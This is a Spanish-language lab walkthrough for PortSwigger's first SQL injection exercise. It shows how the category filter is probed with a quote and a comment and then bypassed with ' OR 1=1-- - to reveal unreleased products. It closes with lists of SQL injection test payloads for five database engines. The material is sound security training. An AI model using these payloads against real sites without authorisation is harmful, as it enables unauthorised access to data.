---
title: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"
description: "Resolución paso a paso del laboratorio Lab 1 de PortSwigger sobre SQLi. Incluye explicación técnica, comandos y recursos."
date: 2025-07-27
showBreadcrumbs: true
showTableOfContents: true
---

## Introducción:

La aplicación hace una consulta SQL que busca productos de una categoría concreta y que ya estén publicados. El objetivo es alterar esa lógica para ver también los productos no publicados.

<img src="/img/LAB1.png" alt="LAB1" style="width: 600px" />

---

## Explicación de la vulnerabilidad

Las SQL Injection existen porque muchas aplicaciones web construyen consultas a una base de datos insertando directamente datos externos (entradas del usuario) sin validarlos ni separarlos correctamente de la lógica de la consulta. 

Al no usar mecanismos seguros un atacante puede manipular esa entrada para alterar el comportamiento de la consulta original, ejecutando instrucciones no previstas por el sistema. 

**Recuerda:** Dependerá de cómo se interprete lo que escribas en el campo para que la consulta haga algo más allá de lo que fue diseñada para hacer.

---

## Paso a paso de la explotación

1. **Ubicar el input donde vas a inyectar.** De nada sirve conocer mil payloads si no sabés dónde aplicarlos. ¿Qué nos indica el enunciado? "Vulnerabilidad de inyección SQL en el filtro de categorías de productos". 

 Para visualizar el filtro, es necesario hacer clic en alguna de las categorías disponibles en la página.
<img src="/img/LAB1.1.png" alt="LAB1.1" style="width: 600px" />
<img src="/img/LAB1.2.png" alt="LAB1.2" style="width: 500px" />
2. Ya identificado el input que vas a atacar porque en este punto no sabes si es o no es vulnerable, el siguiente paso es aplicar inyecciones; es decir, utilizar la sintaxis propia del lenguaje SQL según el motor utilizado (MySQL, MSSQL, Oracle, PostgreSQL, SQLite, entre otros).

Cada uno posee funciones, operadores y mecanismos específicos que debes tener en cuenta para confirmar una vulnerabilidad de este tipo.

3. Este es un primer paso en el análisis de esta vulnerabilidad, así que comenzaremos con una comilla simple (`'`).
<img src="/img/LAB1.3.png" alt="LAB1.3" style="width: 500px" />

4. Esto ocasiona un error. A partir de aquí, lo que sigue es comentar lo que sigue en la consulta con `-- -` para ver si podemos evitar que el error ocurra.
<img src="/img/LAB1.4.png" alt="LAB1.4" style="width: 500px" />

5. En este punto, todo lo que se encuentre entre `'` y `--` es lo que podemos agregar a la consulta para lograr lo que necesitamos. En el caso de este laboratorio, se nos pide "hacer que la aplicación muestre uno o más productos no lanzados", así que usaremos:
```SQL
' OR 1=1-- -
```
<img src="/img/LAB1.6.png" alt="LAB1.6" style="width: 500px" />
6. De este modo, podremos visualizar productos no lanzados directamente desde la aplicación web.
<img src="/img/LAB1.7.png" alt="LAB1.7" style="width: 300px" />
<img src="/img/LAB1.5.png" alt="LAB1.5" style="width: 500px" />

## Extra

>**Estos son algunos ejemplos que probaría en los distintos campos de entrada para comenzar el reconocimiento de esta vulnerabilidad. Esta se encuentra asociada al control OTG-INPV-005 ("Input Validation") del OWASP Testing Guide.**

>**Si quieres profundizar en este punto del OTG, o conocer más sobre la metodología que aplico día a día como pentester, al final del módulo vas a encontrar un artículo personal en el que detallo cómo integro el OWASP Test Guide en mis flujos de análisis.**

🐬 **MySQL**
```SQL
' OR '1'='1' -- 
' UNION SELECT null, version() -- 
' AND SLEEP(5) -- 
' ORDER BY 3 -- 
```

🧱 **MSSQL**
```SQL
' OR 1=1 -- 
' UNION SELECT NULL, @@version -- 
' AND 1=CONVERT(INT, '1') -- 
' WAITFOR DELAY '00:00:05' -- 
```

🧿 **Oracle**
```SQL
' OR 1=1 -- 
' UNION SELECT null FROM dual -- 
' AND 1=(SELECT COUNT(*) FROM all_users) -- 
' AND EXISTS(SELECT 1 FROM dual WHERE 1=1) -- 
```

🦉 **PostgreSQL**
```SQL
' OR TRUE -- 
' UNION SELECT null, current_database() -- 
' AND pg_sleep(5) -- 
' AND 1=CAST('1' AS INTEGER) -- 
```

🧃 **SQLite**
```SQL
' OR 1=1 -- 
' UNION SELECT name FROM sqlite_master WHERE type='table' -- 
' AND 1=1 -- 
' ORDER BY 1 -- 
```

---

